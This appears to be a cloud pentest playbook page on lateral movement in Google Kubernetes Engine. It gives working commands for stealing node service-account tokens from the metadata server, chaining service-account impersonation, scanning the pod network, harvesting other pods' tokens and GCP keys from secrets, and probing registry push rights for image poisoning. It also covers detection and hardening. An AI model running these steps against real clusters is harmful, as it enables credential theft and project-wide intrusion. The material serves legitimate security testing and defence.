---
cstg_id: CSTG-GCP-GKE-LATERAL
title: "GCP Gke - Lateral Movement"
provider: gcp
service: gke
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - container.clusters.getCredentials
  - container.pods.create
  - container.pods.exec
  - container.secrets.get
  - iam.serviceAccounts.getAccessToken
  - iam.serviceAccounts.actAs
  - compute.instances.get
tools:
  - gcloud CLI
  - kubectl
  - GCP instance metadata server
  - Kubernetes API server
  - container registry clients (docker / crane)
references:
  - "https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity"
  - "https://cloud.google.com/compute/docs/metadata/overview"
  - "https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview"
  - "https://kubernetes.io/docs/concepts/services-networking/"
  - "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
  - "https://rhinosecuritylabs.com/cloud-security/kubernetes-privilege-escalation/"
  - "https://hackingthe.cloud/gcp/"
  - "https://kubernetes.io/docs/concepts/security/"
license: CC BY-SA 4.0
---

## Summary

Lateral movement in GKE is the use of an established foothold - a compromised
pod, a node, a stolen ServiceAccount token, or a cluster-admin credential - to
reach *other* resources: sibling pods and namespaces, the underlying nodes, the
container registry, peered VPC services, and the wider GCP project via attached
service accounts. Because a GKE cluster bridges the Kubernetes data plane and
the GCP project, movement flows in two directions: deeper into the cluster
(namespace to namespace, pod to node) and outward into GCP (pod identity to
project resources). The objective is to map and exercise every reachable hop
from the current position and to demonstrate the realistic blast radius.

This phase consumes the identities and access surfaced during enumeration
([gcp-gke-enum.md](../02-services/gcp-gke-enum.md)) and the escalation primitives
that produced the foothold
([gcp-gke-privesc.md](../03-privilege-escalation/gcp-gke-privesc.md)). Where a
hop yields a GCP service-account token, expansion across the project continues
in [gcp-iam-privesc.md](../03-privilege-escalation/gcp-iam-privesc.md). The key
GKE-specific bridges are the **node metadata server** (pod -> node SA -> GCP),
**Workload Identity** (pod KSA -> bound GSA -> GCP), and the cluster's **flat
pod network** (pod -> any other pod/service reachable on the cluster network).

## Prerequisites

Assumed-breach access in one of the typical starting states: a kubeconfig for
the cluster, a ServiceAccount token mounted inside a compromised pod
(`/var/run/secrets/kubernetes.io/serviceaccount/token`), shell on a node, or a
GCP principal with `getCredentials` plus an in-cluster RBAC binding. Confirm the
current vantage point on both planes:

```bash
# In-pod: identity and reachability
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-20
kubectl auth can-i --list --all-namespaces 2>/dev/null

# Is the metadata server reachable (Workload Identity not enforced)?
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
```

## Enumeration

```bash
# Reachable workloads, services, and cluster networking
kubectl get pods --all-namespaces -o wide
kubectl get services --all-namespaces -o wide
kubectl get endpoints --all-namespaces
kubectl get networkpolicies --all-namespaces       # absence = flat, open pod network

# Identities reachable for movement
kubectl get serviceaccounts --all-namespaces -o yaml | grep -i gcp-service-account
gcloud iam service-accounts list --project <PROJECT_ID>

# From a node: which SA and scopes does this node carry?
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

## Misconfigurations & Findings

- **No NetworkPolicy** - the default flat pod network lets any compromised pod
  reach every other pod and Service in the cluster, including databases and
  internal admin UIs.
- **Workload Identity disabled / metadata reachable** - any pod can assume the
  node SA and pivot to GCP.
- **Node SA over-privileged** (default Compute SA / `cloud-platform` scope) -
  one node compromise equals project-wide GCP access.
- **Shared, over-broad GSAs across namespaces** - one Workload-Identity GSA used
  by many workloads widens the blast radius of any single pod compromise.
- **Reused image-pull credentials / registry write access** - enables supply-
  chain movement by poisoning images other workloads pull.
- **etcd / control-plane reachable** from the node network without restriction.

## Exploitation

### Pod-to-GCP via the node metadata server

When Workload Identity is not enforced (or legacy metadata is exposed), a pod
requests the node service account's access token directly and replays it against
the GCP API, moving from the cluster into the project as the node SA.

```bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | jq -r .access_token)

# Replay against GCP - scope of access = node SA IAM intersected with node scopes
curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
gcloud projects get-iam-policy <PROJECT_ID> --access-token-file=<(echo "$TOKEN")
```

### Pod-to-GCP via Workload Identity

A pod whose KSA is annotated with a GCP service account obtains GSA credentials
transparently through the GKE metadata server. From inside such a pod, the
gcloud/REST calls execute as the bound GSA, granting whatever that GSA can do
across the project.

```bash
# Inside a Workload-Identity pod, the SDK auto-resolves the bound GSA:
gcloud auth print-access-token
gcloud storage ls   # acts as the bound GSA
```

Correlate the bound GSA's roles to find the next hop - buckets, Secret Manager,
Pub/Sub, Cloud SQL, or further SA impersonation
([gcp-iam-privesc.md](../03-privilege-escalation/gcp-iam-privesc.md)).

### Service-account token impersonation chains

A node SA or Workload Identity GSA that holds
`iam.serviceAccounts.getAccessToken` (or `actAs`) on a *more privileged* SA can
mint that SA's token, chaining outward to higher privilege without ever touching
a key file.

```bash
gcloud iam service-accounts get-access-token <HIGHER_PRIV_SA> \
  --impersonate-service-account=<HIGHER_PRIV_SA> \
  --scopes=https://www.googleapis.com/auth/cloud-platform
```

### Pod-to-pod and cross-namespace movement (flat network)

Without NetworkPolicy, a compromised pod reaches every Service and pod IP in the
cluster. Enumerate and connect to internal services - databases, caches, admin
dashboards, the kubelet, and other apps - that assume network isolation.

```bash
# From the foothold pod
for svc in $(kubectl get svc -A -o jsonpath='{range .items[*]}{.spec.clusterIP}:{.spec.ports[0].port}{"\n"}{end}'); do
  nc -zv -w2 ${svc/:/ } 2>&1
done
# Reach a DB in another namespace directly by ClusterIP / DNS name
psql "host=<svc>.<ns>.svc.cluster.local user=app dbname=app"
```

### Pod-to-node, then node-to-cluster

A breakout to the node (privileged pod, hostPath, or a node CVE) yields root on
the GCE VM, the kubelet credentials, and the node SA token. The kubelet
credentials and any other pods' mounted tokens on that node can then be
harvested and replayed, moving laterally to whatever those identities can reach.

```bash
# On the node (post-breakout)
ls /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token
cat /var/lib/kubelet/pods/<UID>/volumes/.../token   # another pod's SA token
```

### Secret harvesting across namespaces

A credential with cluster-wide secret read collects every ServiceAccount token,
image-pull secret, and embedded GCP SA key, each of which is a fresh identity to
move with.

```bash
kubectl get secrets -A -o json | jq -r '
  .items[] | select(.data["key.json"] != null)
  | .data["key.json"]' | base64 -d > stolen-gsa-key.json
gcloud auth activate-service-account --key-file=stolen-gsa-key.json
```

### Registry and supply-chain movement

Node/Workload-Identity SAs frequently hold pull (and sometimes push) rights to
Artifact Registry / Container Registry. Push access allows poisoning an image
tag that other workloads pull, moving laterally into namespaces the current
credential cannot reach directly.

```bash
gcloud auth configure-docker <REGION>-docker.pkg.dev
crane copy <REGION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/app:latest \
  <REGION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/app:backup   # confirm push rights
```

### VPC and peered-service reach

Pods egress through the node's VPC. A foothold can reach VPC-internal endpoints -
Cloud SQL private IPs, internal load balancers, Memorystore, peered on-prem
ranges, and other GCE instances - that are firewalled from the internet but open
to the cluster's pod/node ranges.

```bash
# From the node/pod, scan reachable internal ranges
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/"
```

## Detection & Logging

Movement leaves traces across **Cloud Audit Logs** and platform telemetry:

- **GCP API replay** of a node/Workload-Identity token appears in Admin
  Activity / Data Access logs under the node or GSA `principalEmail`; mismatches
  between the calling identity and expected workload behaviour are a key signal.
- **Service-account token minting** (`GenerateAccessToken`,
  `generateAccessToken`) is logged on the IAM Credentials API.
- **Kubernetes API server logs** (`resource.type="k8s_cluster"`) record
  `pods/exec`, pod creation, and bulk secret reads.
- **VPC Flow Logs** and firewall logs capture unexpected east-west and
  pod-to-internal-service connections.

```bash
gcloud logging read \
  'protoPayload.methodName="GenerateAccessToken"
   OR (resource.type="k8s_cluster" AND protoPayload.methodName:"pods.exec.create")' \
  --project=<PROJECT_ID> --freshness=2d --format=json
```

- Token requests to the metadata server followed by GCP API calls from a node
  IP, cross-namespace secret enumeration, and registry pushes from a workload
  identity are high-fidelity lateral-movement signatures. Security Command
  Center, GKE Security Posture, and Event Threat Detection surface node-SA
  abuse, anomalous service-account usage, and suspicious network activity.

## Remediation & Hardening

- Enforce **Workload Identity** and **disable legacy/GCE metadata** so pods
  cannot assume node SAs; give each workload a **dedicated least-privilege GSA**,
  never a shared or default SA.
- Apply **NetworkPolicy** (Dataplane V2) to segment pod-to-pod and
  cross-namespace traffic; default-deny east-west by namespace.
- Restrict `iam.serviceAccounts.getAccessToken` / `actAs` to prevent
  impersonation chains; scope registry write access narrowly and enable Binary
  Authorization to block poisoned images.
- Enforce **Pod Security Standards** to prevent node breakouts (no privileged,
  hostPath, hostPID, hostNetwork pods).
- Restrict the cluster's egress and use private clusters + firewall rules so
  pods cannot freely reach VPC-internal and peered services.
- Enable **VPC Flow Logs**, firewall logging, and Kubernetes API server audit
  logs; alert on metadata-token-then-API-call patterns.

## Tools

- **kubectl** for in-cluster movement (`exec`, pod creation, secret reads,
  cross-namespace access).
- **GCP metadata server** for node/Workload-Identity token retrieval.
- **gcloud CLI** and the **IAM Credentials API** for impersonation chains and
  GCP API replay.
- **Container registry clients** (`docker`, `crane`) for supply-chain movement.

## References

- Workload Identity - https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity
- Compute metadata overview - https://cloud.google.com/compute/docs/metadata/overview
- GKE network overview - https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview
- Kubernetes services and networking - https://kubernetes.io/docs/concepts/services-networking/
- Create short-lived credentials - https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
- Rhino Security Labs - Kubernetes privilege escalation - https://rhinosecuritylabs.com/cloud-security/kubernetes-privilege-escalation/
- Kubernetes security concepts - https://kubernetes.io/docs/concepts/security/
- Hacking the Cloud (GCP) - https://hackingthe.cloud/gcp/
